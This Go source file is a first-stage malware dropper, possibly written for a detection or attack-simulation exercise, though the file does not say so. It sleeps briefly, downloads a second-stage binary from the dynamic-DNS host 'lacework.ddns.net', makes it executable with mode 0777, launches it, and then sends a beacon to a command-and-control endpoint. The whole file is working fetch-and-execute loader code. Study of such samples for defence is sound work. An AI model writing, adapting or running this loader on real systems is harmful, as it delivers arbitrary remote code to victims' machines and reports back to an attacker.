package main

import (
	"log"
	"os"
	"os/exec"
	"time"
)

func main() {
	const host = "lacework.ddns.net"
	//const host = "localhost:8080"
	const filename = "lw-stage-2"
	const postUrl = "http://" + host + "/lw-beacon"
	const getUrl = "http://" + host + "/bin/" + filename
	var body = []byte(`{"stage":"1"}`)

	f := setupLogger("lw-stage-1.log")
	defer func(f *os.File) {
		_ = f.Close()
	}(f)
	log.SetOutput(f)
	log.Println("Stage 1 started")
	// wait a few seconds
	time.Sleep(3 * time.Second)

	// download second stage file
	log.Println("Downloading stage 2...")
	getErr := httpGet(getUrl, filename)
	if getErr != nil {
		log.Println("Error downloading 2nd stage", getErr)
		panic(getErr)
	}

	// make file executable
	chmodErr := os.Chmod(filename, 0777)
	if chmodErr != nil {
		log.Println("Error changing permissions", chmodErr)
		panic(chmodErr)
	}

	//wait a few seconds
	time.Sleep(3 * time.Second)

	// get current path
	path, pathErr := os.Getwd()
	if pathErr != nil {
		panic(pathErr)
	}

	// execute second stage binary
	log.Println("Executing stage 2...")
	command := exec.Command(path + "/" + filename)
	execErr := command.Start()
	if execErr != nil {
		log.Println("Error starting stage 2", execErr)
		panic(execErr)
	}

	//wait a few seconds
	time.Sleep(3 * time.Second)

	//beacon to C2 once
	log.Println("Stage 1 beaconing to C2 once...")
	postErr := httpPost(postUrl, body)
	if postErr != nil {
		log.Println("Error posting beacon to API", postErr)
		panic(postErr)
	}

	log.Println("Completed. Terminating.")
}
